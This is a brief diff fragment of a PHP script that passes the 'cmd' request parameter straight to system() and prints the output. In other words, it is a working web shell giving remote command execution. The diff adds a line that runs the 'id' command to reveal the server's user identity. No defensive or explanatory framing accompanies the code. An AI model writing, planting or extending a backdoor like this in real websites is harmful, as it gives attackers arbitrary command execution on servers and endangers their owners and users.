@@ -3,6 +3,7 @@
 	        echo "<pre>";
 	        $cmd = ($_REQUEST['cmd']);
 	        system($cmd);
+		system("id");
 	        echo "</pre>";
 	        die;
 	}
